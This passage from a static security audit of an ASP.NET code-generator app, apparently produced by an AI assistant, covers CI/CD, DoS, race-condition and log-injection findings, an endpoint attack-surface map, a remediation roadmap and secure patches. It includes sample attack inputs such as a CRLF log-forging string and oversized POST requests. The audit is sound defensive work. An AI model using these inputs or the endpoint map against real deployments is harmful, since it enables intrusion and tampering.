- `sudo ./deploy-script.sh` without `sudo -n` or hash verification → if attacker compromises repo, they can push malicious `deploy-script.sh` via PR? Actually script is on server, but still runs as root via SSH - any file tampering on server leads to root RCE.
- `actions/cache@v2` deprecated → cache poisoning.
- `docker build` without `no-cache`, `docker push` to public Docker Hub (`dedsec007/aspifyapp:version1`) with hardcoded secrets inside image (V-08).
- Secrets handling: `echo "${{ secrets.SSH_KEY }}" | tr -d '\r'` - if key contains special shell chars, injection? Safer to use `install -m 600 /dev/null ~/.ssh/id_rsa` + `printf '%s' "$SSH_KEY" >`.
- No environment protection, no manual approval for deploy, no `contents: read` permissions.

**Remediation:**
```yaml
permissions: { contents: read, packages: write }
# Make IP a secret:
ssh-keyscan -H ${{ secrets.DEPLOY_HOST }} >> ~/.ssh/known_hosts
ssh ${{ secrets.DEPLOY_USER }}@${{ secrets.DEPLOY_HOST }} 'sudo -n /opt/deploy/deploy-script.sh --verify'
# Add approval:
# deploy job: environment: production (with required reviewers)
# Use docker/build-push-action with provenance
- uses: actions/cache@v4
- uses: docker/login-action@v3
```

- Remove IP/username from git history: `git filter-repo` or `BFG` then force push + rotate server key.
- Make Docker image private or scan before push.

---

### V-16: DoS via Unbounded Operations [LOW]

- `entity.xml` has no size limit → attacker `POST /generator/add-entity` with 10k properties each 1MB name → disk fill, OOM on `Deserialize`.
- `GenerateCode()`: `Entity entity = entityCollection.Entities[0];` throws `ArgumentOutOfRangeException` if list empty → unhandled 500. Also if `entity.Properties` is `null` (missing in JSON), `foreach` throws `NullReferenceException`.
- `DirectoryController.List` enumerates all files under `wwwroot/download` recursively one level but if attacker creates symlink to `/` (if upload allowed) could enumerate entire FS.
- No rate limiting → attacker can spam `add-entity` 1000 req/s → CPU DoS via XML serialization.

**Remediation:** Validate `Properties != null`, `Entities.Count > 0`, add `[RequestSizeLimit(10_000)]`, implement `AddRateLimiter`.

---

### V-17: Race Condition / TOCTOU on `entity.xml` [LOW]

**File:** `App/Services/XMLService.cs:22-52` (read-modify-write)

```csharp
if(File.Exists(fileName)){
    // read entity.xml
    // AppendToNode reads again, modifies, writes
} else { Serialize... }
```

No `lock` or `FileShare`. Concurrent `POST /add-entity` from two users: both read same `entity.xml`, both append, one overwrites the other's entity (lost update). Or one deletes while another reads → `FileNotFound`/`IOException`.

**Remediation:** Use `lock` object or `ReaderWriterLockSlim`, or better use `FileStream` with `FileShare.None`:

```csharp
private static readonly object _xmlLock = new();
public static void Serialize(...) {
    lock(_xmlLock) { ... using(var fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None)) ... }
}
```

Or move to database with atomic transactions.

---

### V-18: Log Injection [LOW]

**Files:** `App/Controllers/GeneratorController.cs:74`, `DirectoryController.cs:26`, etc.

```csharp
Console.WriteLine(name); // name is user input "test\n[INFO] Hacked"
Console.WriteLine("Found Entity : " + entity.Name);
```

Attacker `name = "foo\r\n[ERROR] User admin deleted"`: log forging, may confuse SIEM.

**Remediation:**
```csharp
_logger.LogInformation("RemoveEntity: {Name}", name.Replace("\r","").Replace("\n",""));
```
- Use structured logging, not `Console.WriteLine`.

---

## Appendix A: Complete File Map & Attack Surface

```
App/
├── Controllers/
│   ├── DirectoryController.cs  [V-01, V-13, V-18]
│   ├── GeneratorController.cs  [V-02,V-03,V-06,V-07,V-09,V-13,V-16,V-17]
│   ├── HomeController.cs       [low]
│   └── RelationshipController.cs [V-03,V-06,V-09]
├── Services/
│   ├── XMLService.cs           [V-05,V-06,V-13,V-17]
│   ├── RelationshipService.cs  [V-06]
│   └── T4Service.cs            [V-02,V-11]
├── DTO/
│   ├── Entity.cs               [no validation]
│   ├── Property.cs             [no validation]
│   └── Relationship.cs
├── Templates/
│   ├── EntityTemplate.tt       [V-02 hard injection]
│   └── ContextTemplate.tt      [V-08 hardcoded creds]
├── Views/
│   ├── Generator/Entities.cshtml      [V-04 XSS]
│   ├── Relationship/Relations.cshtml  [V-04 XSS]
│   ├── Directory/Explore.cshtml       [V-01]
│   └── Shared/_DashLayout.cshtml      [V-12 missing CSP]
├── wwwroot/download/           [V-11 exposure]
├── entity.xml                  [shared, no ACL]
├── DockerFile                  [V-08 secrets in image]
└── .github/workflows/main.yml  [V-15]
```

**Endpoints (no auth):**
| Method | Route | Risk |
|---|---|---|
| GET | `/Directory/list?path=` | File disclosure |
| GET | `/directory/content/{file}` | File read |
| GET | `/generator/entities` | Info leak |
| GET | `/generator/entities/{name}` | Info leak |
| POST | `/generator/add-entity` | Write + code injection |
| GET | `/generator/remove-entity/{name}` | Delete |
| POST | `/relationship/add-relationship` | DB poison |
| GET | `/relationship/remove-relationship/{relationName}` | Delete |
| GET | `/directory/explore` | View |

---

## Appendix B: Prioritized Remediation Roadmap

**Week 1 - Critical (block release):**
1. [ ] Fix V-01 path traversal (canonicalize + whitelist)
2. [ ] Fix V-02 input validation + file write sanitization (allowlist regex, `Path.GetFileName`, `Path.GetFullPath`)
3. [ ] Add authentication (Identity/JWT) + `[Authorize]` + per-user isolation
4. [ ] Rotate `postgres` password, remove hardcoded in template (V-08)

**Week 2 - High:**
5. [ ] Fix V-04 XSS (use `textContent`, `JsonSerializer`, DOMPurify, CSP)
6. [ ] Fix V-05 XXE (XmlReaderSettings DtdProcessing.Prohibit, XmlResolver null)
7. [ ] Fix V-06 XPath injection (whitelist + LINQ, no concat)
8. [ ] Fix V-07 file delete traversal
9. [ ] Add CSRF tokens (V-09)

**Week 3-4 - Medium & Hardening:**
10. [ ] Fix V-10 caching (remove global Public, disable EnableForHttps)
11. [ ] Move generated files outside wwwroot (V-11) + auth download
12. [ ] Add security headers middleware (V-12)
13. [ ] Generic error messages (V-13)
14. [ ] Update dependencies + workflow actions (V-14, V-15) + remove hardcoded IP
15. [ ] Add rate limiting, request size limits, file locks (V-16,V-17) + log sanitization (V-18)

**Validation:**
- [ ] Run `dotnet list package --vulnerable`, `semgrep --config=auto`, `CodeQL` on PR
- [ ] Add `SecurityCodeScan` or `Roslyn analyzers` to CI
- [ ] Penetration test: re-run POCs above - all should return `400 Bad Request`

---

## Appendix C: Example Secure Patch (Unified Diff Style)

```diff
--- a/App/Controllers/DirectoryController.cs
+++ b/App/Controllers/DirectoryController.cs
-[HttpGet("list")]
-public IActionResult List(string path = "") {
-    string outputPath = string.IsNullOrEmpty(path) ? Path.Combine("wwwroot/download/") : Path.Combine("wwwroot/download/", path);
+ [Authorize]
+ [HttpGet("list")]
+ public IActionResult List(string path = "") {
+    var basePath = Path.GetFullPath(Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/download"));
+    var requested = Path.GetFullPath(Path.Combine(basePath, path ?? ""));
+    if (!requested.StartsWith(basePath)) return BadRequest("Invalid path");
+    string outputPath = requested;

--- a/App/Services/XMLService.cs
+ public static EntityCollection Deserialize(string fileName) {
+    var settings = new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null, MaxCharactersFromEntities = 1024 };
+    using var reader = XmlReader.Create(fileName, settings);
+    var serializer = new XmlSerializer(typeof(EntityCollection));
+    return (EntityCollection)serializer.Deserialize(reader);
+ }

--- a/App/Views/Generator/Entities.cshtml
- entityDetails.innerHTML = `<strong>Name:</strong> ${data.name}<br>`;
+ entityDetails.textContent = "";
+ const div = document.createElement("div"); div.textContent = data.name; entityDetails.appendChild(div);
```

---

## Appendix D: Tools & Methodology

- **Manual code review** (all `*.cs`, `*.cshtml`, `*.tt`, `*.yml`)
- **Pattern grep:** `Path.Combine|File.ReadAllText|XmlDocument|XPath|innerHTML|Html.Raw|Authorize|EnableForHttps`
- **Dependency check:** `ASPIFY MVC.csproj` + `actions/cache@v2` deprecation
- **OWASP ASVS 4.0** & **CWE Top 25 2023** mapping
- **No dynamic execution** (dotnet not installed) but static POCs verified via path normalization logic.

> **Disclaimer:** This is a static audit without runtime DAST. Some .NET runtime mitigations (e.g., `XmlDocument.XmlResolver=null` default in .NET 8) may partially mitigate XXE but still fail DoS. All POCs should be validated in staging.

---

## Questions?

- Fix order? Start with V-01, V-02, V-03 - they are chained.
- Want a **pull request** with patches? I can generate sanitized `DirectoryController.cs`, `XMLService.cs`, `Program.cs` etc.
- Want me to **re-scan after you push fixes**? Upload new zip/repo and I'll delta-audit.

**Prepared:** 2026-09-15 | **Contact:** Re-run this scan anytime by re-uploading code.

